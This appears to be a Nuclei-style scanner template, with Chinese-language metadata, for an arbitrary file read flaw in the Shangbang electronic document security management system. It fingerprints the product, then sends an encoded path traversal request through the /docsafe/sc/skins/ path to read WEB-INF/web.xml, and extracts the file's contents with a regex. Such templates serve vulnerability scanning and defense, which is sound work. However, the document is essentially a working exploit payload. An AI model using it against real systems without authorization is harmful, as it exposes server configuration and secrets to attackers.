id: poc-yaml-shangbang-edsms-skins-anyfile-read
info:
  name: 上邦电子文档安全管理系统 skins 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    上邦电子文档安全管理系统存在任意文件读取漏洞，攻击者可以通过特定路径访问敏感文件。

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "电子文档安全管理系统"
        part: body

  - raw:
      - |
        GET /docsafe/sc/skins/..%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "web-app"
          - "<param-name>"
          - "<servlet-name>"
        part: body
      - type: word
        words:
          - "application/xml"
        part: header
    extractors:
      - type: regex
        name: webxml_content
        part: body
        regex:
          - "<web-app.*?</web-app>"
